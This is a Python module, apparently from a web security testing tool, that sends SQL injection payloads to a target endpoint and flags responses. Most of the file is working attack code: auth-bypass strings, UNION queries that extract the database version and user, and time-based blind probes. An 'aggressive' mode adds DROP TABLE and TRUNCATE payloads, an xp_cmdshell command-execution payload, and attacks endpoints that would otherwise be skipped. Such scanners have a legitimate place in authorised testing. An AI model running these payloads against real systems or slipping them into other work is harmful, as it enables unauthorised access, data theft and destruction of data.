from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # 1. Baseline - Establish "Safe" State
    baseline = client.send(scenario.method, scenario.target, json_body={"username": "test", "password": "password"})
    
    if baseline.status_code in [404, 405]:
        if scenario.config.get("aggressive"):
            print(f"    [!] Endpoint {scenario.target} returned {baseline.status_code}, but AGGRESSIVE mode is ON. Attacking anyway...")
        else:
            return {
                "scenario_id": scenario.id,
                "attack_type": "sql_injection",
                "passed": True,
                "skipped": True,
                "details": f"Endpoint returned {baseline.status_code}. Skipping attack."
            }
        
    baseline_len = len(baseline.text)
    
    # Enhanced Payloads (Polyglots & Logic Tests)
    payloads = [
        # 1. Auth Bypass / Boolean Blind
        {"payload": "' OR '1'='1", "type": "auth_bypass"},
        {"payload": '" OR "1"="1', "type": "auth_bypass"},
        {"payload": "' OR 1=1 --", "type": "auth_bypass"},
        {"payload": "admin' --", "type": "auth_bypass"},
        
        # 2. UNION Based Extraction
        {"payload": "' UNION SELECT 1, 'BP_VULN', 3--", "type": "union"},
        {"payload": "' UNION SELECT NULL, @@version, NULL--", "type": "union_extraction"},
        {"payload": "' UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a,user(),0x3a) --", "type": "union_extraction"},
        
        # 3. Time-Based Blind
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "type": "time_based"}, # MSSQL
        {"payload": "' OR SLEEP(5)--", "type": "time_based"},            # MySQL
        {"payload": "' || pg_sleep(5)--", "type": "time_based"},         # Postgres
        
        # 4. Error Provocation
        {"payload": "'", "type": "syntax_test"},
        {"payload": "';", "type": "syntax_test"},
        {"payload": "' AND 1=CONVERT(int, (SELECT @@version)) --", "type": "error_based"}
    ]
    
    # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
    # 5. DESTRUCTIVE / SCHEMA MODIFICATION (Aggressive Mode & Extra)
    is_destructive = scenario.config.get("aggressive", False)
    if is_destructive:
        print("    [!!!] INJECTING DESTRUCTIVE SQL COMMANDS (DROP/TRUNCATE)")
        payloads.extend([
            {"payload": "'; DROP TABLE users; --", "type": "schema_modification"},
            {"payload": "'; DROP TABLE accounts; --", "type": "schema_modification"},
            {"payload": "'; TRUNCATE TABLE users; --", "type": "schema_modification"},
            {"payload": "'; EXEC xp_cmdshell('echo HACKED > C:\\hacked.txt'); --", "type": "rce_via_sqli"}
        ])
    
    fields = scenario.config.get("fields", ["username", "password", "id", "q"])
    variants = []
    
    issues_found = []
    leaked_data = []

    for field in fields:
        for item in payloads:
            p = item["payload"]
            ptype = item["type"]
            
            body = {"username": "test", "password": "password"}
            body[field] = p
            
            # Timing check
            start = time.time()
            resp = client.send(scenario.method, scenario.target, json_body=body)
            duration = time.time() - start
            
            # --- DIFFERENTIAL ANALYSIS ---
            suspicious = False
            reasons = []
            
            lower_text = resp.text.lower()
            resp_len = len(resp.text)
            
            # 1. Error Reflection (Strict)
            err_sigs = [
                "you have an error in your sql syntax", 
                "unclosed quotation mark", 
                "postgresql query failed", 
                "sqlexception", 
                "ora-00933"
            ]
            if any(sig in lower_text for sig in err_sigs):
                suspicious = True
                reasons.append(f"SQL Error Exposed ({ptype})")
                leaked_data.append(f"Error: {resp.text[:150]}...")

            # 2. Boolean Blind / Auth Bypass Check
            if ptype == "auth_bypass":
                # If we see success markers
                if "welcome" in lower_text or "admin" in lower_text or "dashboard" in lower_text:
                    if "welcome" not in baseline.text.lower():
                        suspicious = True
                        reasons.append("Auth Bypass Successful (New Content Detected)")

            # 3. Data Extraction (Union)
            if ptype == "union_extraction":
                indicators = ["ubuntu", "windows", "5.", "8.", "postgres", "sql server"]
                if any(i in lower_text for i in indicators) and not any(i in baseline.text.lower() for i in indicators):
                     suspicious = True
                     reasons.append("DB Version Extracted")
                     leaked_data.append(f"Extracted: {resp.text[:100]}...")
            
            # 4. Time-Based Blind Logic
            if ptype == "time_based":
                if duration > 4.5:
                     suspicious = True
                     reasons.append(f"Time-Based SQLi Confirmed (Delay: {duration:.2f}s)")
            
            variants.append({"field": field, "payload": p, "status": resp.status_code})
            
            if suspicious:
                issues_found.append(f"[CRITICAL] SQLi in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "sql_injection",
        "passed": len(issues_found) == 0,
        "details": {
            "issues": issues_found,
            "leaked_data": list(set(leaked_data))
        }
    }
